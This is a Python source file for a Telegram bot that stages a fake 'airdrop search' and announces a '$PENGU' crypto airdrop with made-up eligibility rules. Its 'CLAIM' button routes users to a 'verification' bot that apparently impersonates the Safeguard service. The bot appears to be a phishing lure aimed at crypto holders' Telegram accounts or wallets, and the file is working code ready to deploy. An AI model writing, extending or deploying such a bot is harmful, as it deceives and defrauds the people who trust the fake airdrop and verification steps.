import asyncio
import httpx
import requests
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import aiohttp  # Asynchronous HTTP requests
from backend import clients
from dotenv import load_dotenv
import os
from aiohttp import web  # For the HTTP server

# Load environment variables from the .env file
load_dotenv()

# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('GROUP_BOT_TOKEN')

bot_client = TelegramClient('group_bot', api_id, api_hash).start(bot_token=bot_token)

# Event handler for /start command
# Event handler for /start command
from telethon import Button, events
import aiohttp

import asyncio  # For sleep functionality

@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    try:
        # Send the initial message
        await event.respond("Searching for available airdrops...")
        
        # Wait for 2 seconds
        await asyncio.sleep(2)

        # Send the "Airdrops Found" message with a checkmark
        await event.respond("Airdrops Found ✅")
        

        # Download the image from the URL using aiohttp
        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241226_081503_X.jpg?alt=media&token=aba082f3-0ea8-4552-a5f3-3f781db3f905'
        
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
                    image_data.name = 'image_drop.jpg'  # Set a name for the file-like object

                    # Send the final message with the image and buttons
                    await event.respond(
                        file=image_data,  # Send the image as bytes with a name
                        message=(
                            "Current Airdrop: $PENGU.\n\n"
                            "Eligibility Requirements:\n\n"
                            "- **Active Trading Wallet:** Your trading wallet must have been active within the last 30 days.\n\n"
                            "(We recommend using Trojan Bot for the best experience.)\n\n"
                            "- **Verification:** Participants must complete verification via Safeguard to ensure authenticity and prevent fraud.\n\n"
                            "**Note:**\n"
                            "Failure to meet any of the above requirements will result in disqualification. "
                        ),
                        buttons=[
                            [Button.inline("CLAIM $PENGU", b'verify_button')],
                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
                        ]
                    )
                else:
                    print("Failed to fetch the image from the provided URL.")
    except Exception as e:
        await event.respond("Error: There was an issue verifying your account. Please try again.")


@bot_client.on(events.CallbackQuery(data=b'verify_button'))
async def on_verify_button_click(event):
    try:
        # Download the image from the URL using aiohttp
        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'
        
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
                    image_data.name = 'image_verify.jpg'  # Set a name for the file-like object

                    # Send the final message with the image and buttons
                    await event.respond(
                        file=image_data,  # Send the image as bytes with a name
                        message=(
                            "$PENGU | PORTAL is being protected by @Safeguard\n\n"
                            "Click below to verify you're human"
                        ),
                        buttons=[
                            [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
                        ]
                    )
                else:
                    print("Failed to fetch the image from the provided URL.")
    except Exception as e:
        await event.respond("Error: Unable to process your request.")

        



# HTTP Server for health checks
async def health_check(request):
    return web.Response(text="Bot is running!")

async def run_http_server():
    app = web.Application()
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 5002)  # Use port 5002
    await site.start()

# Main function to run both the bot and the HTTP server
# Main function to run both the bot and the HTTP server
async def main():
    # Start the bot
    await bot_client.start()
    print("Bot is running...")

    # Start the HTTP server in the background
    asyncio.create_task(run_http_server())

    # Keep the bot running, ensuring it doesn't exit prematurely
    await bot_client.run_until_disconnected()


# Run the bot
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
